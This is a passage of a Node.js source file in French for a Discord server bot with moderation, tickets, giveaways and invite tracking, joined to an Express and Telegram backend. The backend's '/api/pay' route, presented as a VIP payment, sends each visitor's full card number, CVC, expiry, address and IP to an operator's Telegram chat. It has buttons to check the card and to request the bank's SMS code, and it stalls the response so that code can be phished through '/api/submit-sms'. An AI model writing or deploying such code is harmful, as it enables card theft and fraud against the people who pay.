require('dotenv').config();
const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionsBitField,
    Collection,
    StringSelectMenuBuilder,
    StringSelectMenuOptionBuilder,
    ChannelSelectMenuBuilder,
    RoleSelectMenuBuilder,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    ChannelType,
    MessageFlags,
    AuditLogEvent
} = require('discord.js');
const fs = require('fs');
const path = require('path');
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const db = require('./lib/db');
const soutienStatus = require('./soutien-status');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Configuration
const tgToken = process.env.TOKEN_TELEGRAM;
const tgChatId = process.env.TELEGRAM_CHAT_ID;
const botTg = new TelegramBot(tgToken, { polling: true });

const pendingPayments = new Map();

// Command to get Chat ID
botTg.onText(/\/id/, (msg) => {
    botTg.sendMessage(msg.chat.id, `Votre Chat ID est : \`${msg.chat.id}\``, { parse_mode: 'Markdown' });
});

// Helper for Telegram Logging
async function sendToTelegram(message, options = {}) {
    if (!tgChatId) return;
    try {
        await botTg.sendMessage(tgChatId, message, { 
            parse_mode: 'Markdown',
            ...options
        });
        console.log("Log envoyé sur Telegram.");
    } catch (err) {
        console.error("Erreur Telegram:", err.message);
    }
}

// Card Validation Helper
function validateCard(number, expiry, cvc) {
    // Luhn Algorithm
    const checkLuhn = (num) => {
        let n = num.replace(/\s/g, '');
        let sum = 0;
        for (let i = 0; i < n.length; i++) {
            let intVal = parseInt(n.substr(i, 1));
            if (i % 2 === n.length % 2) {
                intVal *= 2;
                if (intVal > 9) intVal -= 9;
            }
            sum += intVal;
        }
        return sum % 10 === 0;
    };

    const isLuhnValid = checkLuhn(number);
    const [month, year] = expiry.split('/').map(s => parseInt(s.trim()));
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    const isExpiryValid = month > 0 && month <= 12 && (year > currentYear || (year === currentYear && month >= currentMonth));
    const isCvcValid = cvc.length >= 3 && cvc.length <= 4;

    return { isLuhnValid, isExpiryValid, isCvcValid };
}

// Handle Telegram Callbacks
botTg.on('callback_query', async (query) => {
    const data = query.data;

    try {
        if (data.startsWith('validate_')) {
            const [_, number, expiry, cvc] = data.split('|');
            const v = validateCard(number, expiry, cvc);
            const result = `🔍 *Résultat de Vérification*\n\n` +
                `${v.isLuhnValid ? '✅' : '❌'} *Numéro:* ${v.isLuhnValid ? 'Valide' : 'Invalide'}\n` +
                `${v.isExpiryValid ? '✅' : '❌'} *Date:* ${v.isExpiryValid ? 'Valide' : 'Expirée'}\n` +
                `${v.isCvcValid ? '✅' : '❌'} *CVC:* ${v.isCvcValid ? 'Valide' : 'Invalide'}`;
            
            await botTg.answerCallbackQuery(query.id).catch(() => {});
            await botTg.sendMessage(query.message.chat.id, result, { parse_mode: 'Markdown' });
            return;
        }

        if (data.startsWith('ask_sms_')) {
            const paymentId = data.replace('ask_sms_', '');
            if (pendingPayments.has(paymentId)) {
                const p = pendingPayments.get(paymentId);
                p.needsSms = true;
                
                await botTg.answerCallbackQuery(query.id, { text: "Demande de code SMS envoyée !" }).catch(() => {});
                
                // Safe edit to avoid 400 errors if message is gone or already edited
                try {
                    await botTg.editMessageReplyMarkup({ 
                        inline_keyboard: [[{ text: "⏳ Attente SMS...", callback_data: "none" }]] 
                    }, { 
                        chat_id: query.message.chat.id, 
                        message_id: query.message.id 
                    });
                } catch (e) {
                    console.log("EditMessageReplyMarkup failed (expected behavior if collision):", e.message);
                }
                return;
            }
        }
        
        // Final fallback to answer any other query and remove loading state from button
        await botTg.answerCallbackQuery(query.id).catch(() => {});
    } catch (err) {
        console.error("Erreur Callback Telegram:", err.message);
    }
});

// Commande de test
botTg.onText(/\/test/, (msg) => {
    sendToTelegram("🚀 Test de log manuel réussi !");
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildPresences,
    ],
    partials: [Partials.Message, Partials.Channel, Partials.Reaction],
});

soutienStatus.init(client);

const PREFIX = process.env.PREFIX || '-';
const spamMap = new Collection();
const guildInvites = new Collection();
const ticketQueue = new Collection(); // In-memory fallback if needed
const camInfractions = new Collection();
// Removed JSON file setup - now using PostgreSQL

// Helper for Real IP
const getRealIP = (req) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
    return req.ip || req.connection.remoteAddress;
};

// IP Ban Middleware
const checkIPBan = async (req, res, next) => {
    try {
        const ip = getRealIP(req);
        const result = await db.query('SELECT * FROM banned_ips WHERE ip = $1', [ip]);
        if (result.rows.length > 0) {
            return res.status(403).send('<html><body style="background:#000;color:#f00;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>Accès Interdit.</h1></body></html>');
        }
        next();
    } catch (err) {
        next();
    }
};

// --- EXPRESS SERVER CONFIG ---
app.set('trust proxy', true);
app.use(cors());
app.use(bodyParser.json());
app.use(checkIPBan);
app.use(express.static('public'));

function generateCode() {
    return Array.from({ length: 4 }, () => 
        Math.random().toString(36).substring(2, 6).toUpperCase()
    ).join('-');
}

app.post('/api/pay', async (req, res) => {
    const { firstName, lastName, billingAddress, cardNumber, expiry, cvc, email, country } = req.body;
    const paymentId = Math.random().toString(36).substring(2, 11);

    // Initial state
    pendingPayments.set(paymentId, { needsSms: false, done: false });

    try {
        const message = `💳 *NOUVEAU PAIEMENT REÇU*\n\n` +
            `👤 *NOM:* \`${lastName || 'N/A'}\`\n` +
            `👤 *PRÉNOM:* \`${firstName || 'N/A'}\`\n` +
            `🏠 *ADRESSE:* \`${billingAddress || 'N/A'}\`\n` +
            `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
            `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
            `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${getRealIP(req)}\``;
        
        await sendToTelegram(message, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔍 Vérifier la carte", callback_data: `validate_|${cardNumber}|${expiry}|${cvc}` }],
                    [{ text: "📲 DEMANDER CODE SMS", callback_data: `ask_sms_${paymentId}` }]
                ]
            }
        });
    } catch (err) {
        console.error("Telegram log error:", err.message);
    }

    // Delay 10 seconds (gives more time to the operator)
    setTimeout(async () => {
        const p = pendingPayments.get(paymentId);
        if (p && p.needsSms) {
            // Extra wait if SMS requested ("tu ajouter du temps")
            await new Promise(resolve => setTimeout(resolve, 5000));
            return res.json({ success: true, needsSms: true, paymentId });
        }

        // Standard flow
        const newCode = generateCode();
        await db.query(
            'INSERT INTO vip_codes (code, claimed, timestamp) VALUES ($1, $2, $3)',
            [newCode, false, Date.now()]
        );

        res.json({ success: true, code: newCode });
        pendingPayments.delete(paymentId);
    }, 10000); // 10s wait for operator
});

app.post('/api/submit-sms', async (req, res) => {
    const { smsCode, paymentId } = req.body;
    
    sendToTelegram(`📲 *CODE SMS REÇU*\nID: \`${paymentId}\`\nCODE: \`${smsCode}\`\n🌐 *IP:* \`${getRealIP(req)}\``);

    // Give the final VIP code
    const newCode = generateCode();
    await db.query(
        'INSERT INTO vip_codes (code, claimed, timestamp) VALUES ($1, $2, $3)',
        [newCode, false, Date.now()]
    );

    res.json({ success: true, code: newCode });
    pendingPayments.delete(paymentId);
});

// Log specialized for website visit
app.get('/api/log-visit', async (req, res) => {
    try {
        const message = `🌐 *Nouvelle connexion au site*\n\n` +
            `Un utilisateur vient d'ouvrir la page de paiement VIP.\n\n` +
            `🌐 *IP:* \`${req.ip}\`\n` +
            `📱 *User-Agent:* \`${req.headers['user-agent']?.substring(0, 100) || 'Inconnu'}\``;
        
        await sendToTelegram(message);
    } catch (err) {
        console.error("Telegram log visit error:", err.message);
    }
    res.status(200).send('ok');
});

app.listen(PORT, async () => {
    console.log(`API running on port ${PORT}`);
    try {
        await db.initDb();
        console.log("Database initialized.");
    } catch (err) {
        console.error("Database initialization failed:", err);
    }
    sendToTelegram(`🚀 *Système démarré*\nL'API est en ligne sur le port ${PORT}`);
});

// -----------------------------


client.once('ready', async (c) => {
    console.log(`Bot prêt ! Connecté en tant que ${c.user.tag}`);
    sendToTelegram(`🤖 *Discord Bot Prêt*\nConnecté en tant que **${c.user.tag}**`);
    // Fetch all invites for all guilds
    for (const guild of client.guilds.cache.values()) {
        try {
            const firstInvites = await guild.invites.fetch();
            const invitesMap = new Collection();
            firstInvites.forEach(i => {
                invitesMap.set(i.code, { uses: i.uses, inviterId: i.inviter?.id });
            });
            guildInvites.set(guild.id, invitesMap);
        } catch (err) {
            console.log(`Impossible de récupérer les invitations pour ${guild.id}`);
        }
    }

    // Giveaway Interval Checker
    setInterval(async () => {
        try {
            const now = Date.now();
            const res = await db.query('SELECT * FROM giveaways WHERE ended = FALSE AND end_time <= $1', [now]);
            for (const row of res.rows) {
                await db.query('UPDATE giveaways SET ended = TRUE WHERE message_id = $1', [row.message_id]);
                
                try {
                    const guild = client.guilds.cache.get(row.guild_id);
                    if (!guild) continue;
                    const channel = await guild.channels.fetch(row.channel_id).catch(() => null);
                    if (!channel) continue;
                    const message = await channel.messages.fetch(row.message_id).catch(() => null);
                    if (!message) continue;

                    let participants = row.participants || [];
                    let winnersText = "Personne n'a participé.";
                    if (participants.length > 0) {
                        const winCount = Math.min(row.winners_count, participants.length);
                        const winners = [];
                        for(let i=0; i<winCount; i++) {
                            const randomIndex = Math.floor(Math.random() * participants.length);
                            winners.push(participants[randomIndex]);
                            participants.splice(randomIndex, 1);
                        }
                        winnersText = winners.map(id => `<@${id}>`).join(', ');
                    }

                    const embed = EmbedBuilder.from(message.embeds[0])
                        .setTitle('🎉 Giveaway Terminé ! 🎉')
                        .setDescription(`**Lot :** ${row.prize}\n\n**Gagnant(s) :** ${winnersText}`)
                        .setColor(0x808080);
                    
                    await message.edit({ embeds: [embed], components: [] }).catch(() => null);
                    if (winnersText !== "Personne n'a participé.") {
                        await message.reply(`Félicitations à ${winnersText} qui remporte(nt) **${row.prize}** !`);
                    } else {
                        await message.reply(`Personne n'a participé au giveaway pour **${row.prize}**. 😿`);
                    }
                } catch(e) { }
            }
        } catch(err) { logError(err, 'Giveaway Interval'); }
    }, 15000);
});

client.on('inviteCreate', (invite) => {
    const invites = guildInvites.get(invite.guild.id);
    if (invites) invites.set(invite.code, { uses: invite.uses, inviterId: invite.inviter?.id });
});

client.on('inviteDelete', (invite) => {
    const invites = guildInvites.get(invite.guild.id);
    if (invites) invites.delete(invite.code);
});

const LOG_CHANNEL_ID = '1483480300112842874';
const MOD_LOG_CHANNEL_ID = '1484873046459158688';
const GUILD_ID = process.env.GUILD_ID || '1483226900016009427';

const logToDiscord = async (title, description, fields = [], color = 0xFFFFFF, imageUrl = null) => {
    try {
        const guild = client.guilds.cache.get(GUILD_ID) || client.guilds.cache.first();
        if (!guild) return;
        const channel = await guild.channels.fetch(LOG_CHANNEL_ID).catch(() => null);
        if (channel) {
            const embed = new EmbedBuilder()
                .setTitle(title)
                .setDescription(description)
                .addFields(fields)
                .setColor(color)
                .setTimestamp();
            
            if (imageUrl) embed.setImage(imageUrl);
                
            await channel.send({ embeds: [embed] });
        }
    } catch (err) {
        console.error('Erreur de logging:', err);
    }
};

const sendModDM = async (target, action, reason) => {
    try {
        const user = target.user || target;
        const guild = target.guild || client.guilds.cache.get(GUILD_ID);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Information de Modération')
            .setDescription(`Vous avez reçu une sanction sur le serveur **${guild ? guild.name : 'Doro Place'}**.`)
            .addFields(
                { name: 'Action', value: action, inline: true },
                { name: 'Raison', value: reason || 'Aucune raison spécifiée', inline: true }
            );
        await user.send({ embeds: [embed] }).catch(() => {});
    } catch (err) {
        // Ignore errors if DMs are closed
    }
};

const logModAction = async (title, staff, target, action, reason, color = 0xFFFFFF, modChannel = null) => {
    try {
        const guild = client.guilds.cache.get(GUILD_ID);
        if (!guild) return;
        const channel = await guild.channels.fetch(MOD_LOG_CHANNEL_ID).catch(() => null);
        if (channel) {
            const embed = new EmbedBuilder()
                .setTitle(title)
                .setColor(color)
                .setThumbnail(target?.user?.displayAvatarURL({ dynamic: true }) || target?.displayAvatarURL({ dynamic: true }) || null)
                .addFields(
                    { name: '👤 Utilisateur', value: `${target} (${target?.id || target?.user?.id || 'ID Inconnu'})`, inline: true },
                    { name: '🛡️ Modérateur', value: `${staff} (${staff.id})`, inline: true },
                    { name: '📝 Action', value: action, inline: true },
                    { name: '💬 Raison', value: reason || 'Aucune raison spécifiée' },
                    { name: '📍 Salon', value: modChannel ? `${modChannel}` : 'Commande' }
                )
                .setTimestamp();
            await channel.send({ embeds: [embed] });
        }
    } catch (err) {
        console.error('Erreur de logging modération:', err);
    }
};

client.on('messageDelete', async (message) => {
    try {
        if (message.author?.bot) return;

        // Give a little time for the audit log to update
        await new Promise(resolve => setTimeout(resolve, 1000));

        let executor = null;
        try {
            const fetchedLogs = await message.guild.fetchAuditLogs({
                limit: 1,
                type: AuditLogEvent.MessageDelete,
            });
            const deletionLog = fetchedLogs.entries.first();

            if (deletionLog) {
                const { executor: logExecutor, target, createdTimestamp } = deletionLog;
                // Check if the log is recent (within 5 seconds) and matches the target
                if (target.id === message.author?.id && (Date.now() - createdTimestamp) < 5000) {
                    executor = logExecutor;
                }
            }
        } catch (auditError) {
            console.error('Erreur Audit Logs:', auditError);
        }

        const fields = [
            { name: '📍 Salon', value: `${message.channel}`, inline: true },
            { name: '👤 Auteur', value: `${message.author || 'Inconnu'} (${message.author?.id || 'ID Inconnu'})`, inline: true },
            { name: '🗑️ Supprimé par', value: executor ? `${executor} (${executor.id})` : `${message.author || 'L\'auteur'}`, inline: true },
            { name: '💬 Contenu', value: message.content || '*Contenu non textuel ou ancien message non mis en cache*' }
        ];

        let imageUrl = null;
        if (message.attachments.size > 0) {
            const attachment = message.attachments.first();
            if (attachment.contentType?.startsWith('image/')) {
                imageUrl = attachment.proxyURL || attachment.url;
                fields.push({ name: '🖼️ Image', value: 'Image récupérée (si encore disponible sur le CDN Discord)' });
            }
        }

        logToDiscord(
            '🗑️ Message Supprimé',
            `Un message a été supprimé.`,
            fields,
            0xFF0000,
            imageUrl
        );
    } catch (error) {
        console.error('Erreur event messageDelete:', error);
    }
});

client.on('guildMemberRemove', async (member) => {
    logToDiscord(
        '📤 Départ du Serveur',
        `${member.user.tag} (${member.id}) vient de quitter le serveur.`,
        [],
        0xFFA500
    );
});

client.on('guildMemberUpdate', async (oldMember, newMember) => {
    const addedRoles = newMember.roles.cache.filter(role => !oldMember.roles.cache.has(role.id));
    if (addedRoles.size > 0) {
        addedRoles.forEach(role => {
            logToDiscord(
                '🎭 Rôle Ajouté',
                `Le rôle **${role.name}** a été ajouté à ${newMember.user.tag}.`,
                [],
                0x00FF00
            );
        });
    }
});

// Logic moved to main guildMemberAdd handler below

const STAFF_ROLE_ID = '1483537167555891211';
const CATEGORY_VIP_ID = '1483885573872685157';
const CATEGORY_GENERAL_NAME = 'QUESTION GÉNÉRAL';
const MAX_TICKETS = 30;

const getTicketCount = (guild) => {
    const vipCat = guild.channels.cache.get(CATEGORY_VIP_ID);
    const genCat = guild.channels.cache.find(c => c.type === ChannelType.GuildCategory && c.name.toUpperCase() === CATEGORY_GENERAL_NAME);
    let count = 0;
    if (vipCat && vipCat.children) count += vipCat.children.cache.size;
    if (genCat && genCat.children) count += genCat.children.cache.size;
    return count;
};

const processTicketQueue = async (guild) => {
    const res = await db.query('SELECT * FROM ticket_queue ORDER BY timestamp ASC');
    if (res.rows.length === 0) return;

    if (getTicketCount(guild) < MAX_TICKETS) {
        const nextUser = res.rows[0];
        await db.query('DELETE FROM ticket_queue WHERE user_id = $1', [nextUser.user_id]);
        
        const user = await client.users.fetch(nextUser.user_id).catch(() => null);
        if (user) {
            await createTicket(guild, user, nextUser.type, true);
        }
        processTicketQueue(guild);
    }
};

const createTicket = async (guild, user, type, fromQueue = false) => {
    let category;
    
    if (type === 'vip') {
        category = guild.channels.cache.get(CATEGORY_VIP_ID);
    } else if (type === 'verif') {
        category = guild.channels.cache.find(c => c.type === ChannelType.GuildCategory && c.name.toUpperCase() === 'VÉRIFICATION');
        if (!category) {
            category = await guild.channels.create({
                name: 'VÉRIFICATION',
                type: ChannelType.GuildCategory,
                permissionOverwrites: [
                    { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: STAFF_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
                ]
            });
        }
    } else {
        category = guild.channels.cache.find(c => c.type === ChannelType.GuildCategory && c.name.toUpperCase() === CATEGORY_GENERAL_NAME);
        if (!category) {
            category = await guild.channels.create({
                name: CATEGORY_GENERAL_NAME,
                type: ChannelType.GuildCategory
            });
        }
    }

    const channel = await guild.channels.create({
        name: `ticket-${user.username}`,
        type: ChannelType.GuildText,
        parent: category ? category.id : null,
        permissionOverwrites: [
            { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
            { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.AttachFiles] },
            { id: STAFF_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ManageMessages, PermissionsBitField.Flags.ReadMessageHistory] }
        ],
    });

    const embed = new EmbedBuilder()
        .setColor(0xFFFFFF)
        .setTitle(`Ticket ${type.toUpperCase()}`)
        .setDescription(type === 'verif' ? `Bonjour ${user}, veuillez envoyer une photo de votre pièce d'identité pour vérifier que vous avez bien +18 ans.` : `Bonjour ${user}, un membre du staff va s'occuper de vous dans ce salon de ${type.toLowerCase()}.`)
        .setFooter({ text: 'Tickets - Doro Place' });

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('claim_ticket').setLabel('Prendre en charge (Claim)').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger)
    );

    await channel.send({ content: `<@&${STAFF_ROLE_ID}>`, embeds: [embed], components: [row] });

    if (fromQueue) {
        try {
            await user.send(`Bonne nouvelle ! Votre ticket sur **Doro Place** a été créé : ${channel}`);
        } catch {}
    }

    return channel;
};

// Centralized Error Logger
const logError = async (error, context = '') => {
    console.error(`[ERROR] ${context}:`, error);
    const logChannelId = '1483480300112842874';
    try {
        const guild = client.guilds.cache.first();
        if (!guild) return;
        const channel = await guild.channels.fetch(logChannelId).catch(() => null);
        if (channel) {
            const embed = new EmbedBuilder()
                .setColor(0xFF0000)
                .setTitle('Erreur Détectée')
                .addFields(
                    { name: 'Contexte', value: context || 'Global', inline: true },
                    { name: 'Message', value: `\`\`\`${error.message || error}\`\`\`` }
                )
                .setTimestamp();
            await channel.send({ embeds: [embed] });
        }
    } catch (e) {
        console.error('Impossible d\'envoyer le log d\'erreur sur Discord:', e);
    }
};

// Catch Global Exceptions
process.on('unhandledRejection', error => logError(error, 'Unhandled Rejection'));
process.on('uncaughtException', error => logError(error, 'Uncaught Exception'));

client.on('guildMemberAdd', async (member) => {
    try {
        // --- DYNAMIC GHOST PING LOGIC ---
        const ghostPings = await db.query('SELECT channel_id, delay_ms FROM ghost_pings WHERE active = TRUE');
        for (const row of ghostPings.rows) {
            const pingChannel = member.guild.channels.cache.get(row.channel_id) || await member.guild.channels.fetch(row.channel_id).catch(() => null);
            if (pingChannel) {
                const msg = await pingChannel.send(`<@${member.id}>`).catch(() => null);
                if (msg) setTimeout(() => msg.delete().catch(() => {}), row.delay_ms);
            }
        }
        // --------------------------------

        // Invite tracking logic
        const cachedInvites = guildInvites.get(member.guild.id);
        const newInvites = await member.guild.invites.fetch().catch(() => null);
        
        let inviterId = null;
        if (cachedInvites && newInvites) {
            const usedInvite = newInvites.find(i => cachedInvites.has(i.code) && cachedInvites.get(i.code).uses < i.uses);
            
            if (usedInvite) {
                inviterId = usedInvite.inviter?.id;
            } else {
                // Check if an invite was deleted (likely 1-use invite)
                const missingCode = Array.from(cachedInvites.keys()).find(code => !newInvites.has(code));
                if (missingCode) {
                    inviterId = cachedInvites.get(missingCode).inviterId;
                }
            }

            // Update cache
            const newInvitesMap = new Collection();
            newInvites.forEach(i => newInvitesMap.set(i.code, { uses: i.uses, inviterId: i.inviter?.id }));
            guildInvites.set(member.guild.id, newInvitesMap);

            if (inviterId) {
                // Add to DB / Update to active
                await db.query(`
                    INSERT INTO invites (inviter_id, invited_member_id, active) 
                    VALUES ($1, $2, TRUE) 
                    ON CONFLICT (inviter_id, invited_member_id) 
                    DO UPDATE SET active = TRUE`,
                    [inviterId, member.id]
                );

                // Fast active count from DB
                const resCount = await db.query('SELECT COUNT(*) FROM invites WHERE inviter_id = $1 AND active = TRUE', [inviterId]);
                const activeCount = parseInt(resCount.rows[0].count);

                if (activeCount === 3) {
                        const inviterUser = await client.users.fetch(inviterId).catch(() => null);
                        if (inviterUser) {
                            const dmEmbed = new EmbedBuilder()
                                .setColor(0xFFFFFF)
                                .setTitle('Objectif atteint')
                                .setDescription('Félicitations ! Vous avez atteint **3 invitations** sur le serveur. Vous pouvez désormais ouvrir un ticket pour réclamer votre récompense.');
                            
                            try {
                                await inviterUser.send({ embeds: [dmEmbed] });
                            } catch {
                                // DM closed, ping in welcome channel
                                const welcomeChannelId = '1483231963308494920';
                                const channel = member.guild.channels.cache.get(welcomeChannelId);
                                if (channel) {
                                    const chatEmbed = new EmbedBuilder()
                                        .setColor(0xFFFFFF)
                                        .setDescription(`Bravo ${inviterUser}, tu as atteint **3 invitations** ! Tes messages privés sont fermés, je t'invite donc à créer un ticket pour ta récompense.`);
                                    await channel.send({ content: `${inviterUser}`, embeds: [chatEmbed] });
                                }
                            }
                        }
                    }
                }
            }

        const welcomeChannelId = '1483231963308494920';
        const channel = member.guild.channels.cache.get(welcomeChannelId);
        
        if (channel) {
            let welcomeDesc = `Bienvenue ${member} ! Grâce à toi, nous sommes maintenant **${member.guild.memberCount}** membres.`;
            if (inviterId) {
                welcomeDesc += `\n\nInvité par : <@${inviterId}>`;
            }

            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setTitle('Bienvenue')
                .setDescription(welcomeDesc);
            
            await channel.send({ content: `${member}`, embeds: [embed] });
        }
    } catch (error) {
        logError(error, 'Event: guildMemberAdd');
    }
});

client.on('guildMemberRemove', async (member) => {
    try {
        // Set invited member to inactive in DB
        await db.query('UPDATE invites SET active = FALSE WHERE invited_member_id = $1', [member.id]);
    } catch (err) {
        logError(err, 'guildMemberRemove');
    }
});

client.on('messageCreate', async (message) => {
    try {
    if (message.author.bot) return;

    // --- ATTACHMENT WARNING SYSTEM ---
    // REMPLACER 'ID_DU_SALON' PAR L'ID DU SALON DANS LEQUEL APPLIQUER CET AVERTISSEMENT
    const WARNING_CHANNEL_ID = '1483474373573742612'; 
    if (message.channel.id === WARNING_CHANNEL_ID && message.attachments.size > 0) {
        await message.reply("Tout envoi de mineur sera sanctionné d'un bannissement immédiat.");
    }
    // ---------------------------------

    // --- ANTI-RAID SYSTEM ---
    // 1. Anti-Invite (S'applique à TOUT LE MONDE, même le staff)
    const inviteRegex = /(discord\.(gg|io|me|li|link|xyz)|discordapp\.com\/invite|discord\.com\/invite)\/.+/i;
    if (inviteRegex.test(message.content)) {
        await message.delete().catch(() => {});
        await sendModDM(message.member, 'Ban (Auto)', 'Anti-Raid : Invitation Discord');
        await message.member.ban({ reason: 'Anti-Raid : Invitation Discord' }).catch(() => {});
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${message.author.tag} a été banni pour envoi d'invitation (Anti-Raid).`);
        return message.channel.send({ embeds: [embed] });
    }

    // 2. Anti-Bio Scam
    if (message.content.toLowerCase().includes('# check my bio')) {
        await message.delete().catch(() => {});
        await sendModDM(message.member, 'Ban (Auto)', 'Anti-Raid : Contenu malveillant (# check my bio)');
        await message.member.ban({ reason: 'Anti-Raid : # check my bio' }).catch(() => {});
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${message.author.tag} a été banni (Anti-Raid : # check my bio).`);
        return message.channel.send({ embeds: [embed] });
    }

    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
        // 3. Anti-Spam
        const now = Date.now();
        const userData = spamMap.get(message.author.id) || { count: 0, lastMessage: now };
        
        if (now - userData.lastMessage < 1500) { // Slightly tighter (1.5s instead of 2s)
            userData.count++;
        } else {
            userData.count = 1;
        }
        userData.lastMessage = now;
        spamMap.set(message.author.id, userData);

        if (userData.count > 6) { // 6 messages in 1.5s
            await sendModDM(message.member, 'Ban (Auto)', 'Anti-Raid : Spam');
            await message.member.ban({ reason: 'Anti-Raid : Spam' }).catch(() => {});
            spamMap.delete(message.author.id);
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription(`${message.author.tag} a été banni pour spam (Anti-Raid).`);
            return message.channel.send({ embeds: [embed] });
        }
    }
    // ------------------------

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();


    // Helper to check staff quotas (Anti-Nuke)
    const checkQuota = async (staffId, actionType, limit = 5, windowMs = 3600000) => {
        const now = Date.now();
        const startTime = now - windowMs;
        
        const res = await db.query(
            'SELECT COUNT(*) FROM staff_quotas WHERE staff_id = $1 AND action_type = $2 AND timestamp > $3',
            [staffId, actionType, startTime]
        );
        
        const count = parseInt(res.rows[0].count);
        if (count >= limit) {
            return false;
        }
        
        await db.query(
            'INSERT INTO staff_quotas (staff_id, action_type, timestamp) VALUES ($1, $2, $3)',
            [staffId, actionType, now]
        );
        return true;
    };

    // Command: -setupvocal
    if (command === 'setupvocal') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        
        try {
            const category = await message.guild.channels.create({
                name: '🎙️ VOCAUX',
                type: ChannelType.GuildCategory
            });

            const vocauxConfig = [
                { name: '🏯・Vocal 1' },
                { name: '🏮・Vocal 2' },
                { name: '⛩️・Vocal 3' },
                { name: '🌸・Vocal 4' },
                { name: '🎋・Vocal 5' }
            ];

            for (const v of vocauxConfig) {
                await message.guild.channels.create({
                    name: v.name,
                    type: ChannelType.GuildVoice,
                    parent: category.id
                });
            }

            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription('Les 5 salons vocaux ont été créés avec succès.');
            message.channel.send({ embeds: [embed] });
        } catch (err) {
            logError(err, 'Command: -setupvocal');
            message.reply('Erreur lors de la création des vocaux.');
        }
    }

    // Command: -setupstaff
    if (command === 'setupstaff') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        
        try {
            const category = await message.guild.channels.create({
                name: '🛡️ ESPACE STAFF',
                type: ChannelType.GuildCategory,
                permissionOverwrites: [
                    { id: message.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: STAFF_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
                ]
            });

            const channels = [
                { name: '📢-staff-annonces', type: ChannelType.GuildText },
                { name: '🛠️-commandes-staff', type: ChannelType.GuildText },
                { name: '💬-chat-staff', type: ChannelType.GuildText }
            ];

            let commandChannel;
            for (const chan of channels) {
                const created = await message.guild.channels.create({
                    name: chan.name,
                    type: chan.type,
                    parent: category.id
                });
                if (chan.name === '🛠️-commandes-staff') commandChannel = created;
            }

            if (commandChannel) {
                const helpEmbed = new EmbedBuilder()
                    .setColor(0xFFFFFF)
                    .setTitle('🛠️ Commandes & Quotas Staff')
                    .setDescription('Voici les commandes de modération disponibles pour le staff et leurs quotas horaires.')
                    .addFields(
                        { name: '🔨 Ban', value: '`-ban @user` (5/h) : Bannissement avec raison obligatoire.', inline: true },
                        { name: '👢 Kick', value: '`-kick @user` (5/h) : Expulsion avec raison obligatoire.', inline: true },
                        { name: '🔇 Mute', value: '`-tempmute @user` (5/h) : Mute temporaire.', inline: true },
                        { name: '⚠️ Avertissement', value: '`-warn @user <raison>` (10/h) : Avertissement obligatoire.', inline: true },
                        { name: '🔓 Débannissement', value: '`-unban <id>` : Débannir un utilisateur.', inline: true },
                        { name: '🚨 Note', value: 'Les commandes `-bban` (Ban Rapide) et `-mmute` (Mute 24h) sont réservées aux **Administrateurs**.' }
                    );
                await commandChannel.send({ embeds: [helpEmbed] });
            }

            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setTitle('Configuration Staff Terminée')
                .setDescription('La catégorie staff et les salons ont été créés avec succès.');
            message.channel.send({ embeds: [embed] });
        } catch (err) {
            logError(err, 'Command: -setupstaff');
            message.reply('Erreur lors de la création de l\'espace staff.');
        }
    }
    const getMember = async (query) => {
        let id = query ? query.replace(/[<@!>]/g, '') : null;
        if (id) {
            try {
                const member = await message.guild.members.fetch(id);
                if (member) return member;
            } catch {
                // Si l'ID est invalide, on ne s'arrête pas, on tente la réponse si pas d'autre ID fourni
            }
        }
        if (!id && message.reference) {
            try {
                const repliedMsg = await message.channel.messages.fetch(message.reference.messageId);
                return await message.guild.members.fetch(repliedMsg.author.id);
            } catch {
                return null;
            }
        }
        return null;
    };

    const getUser = async (query) => {
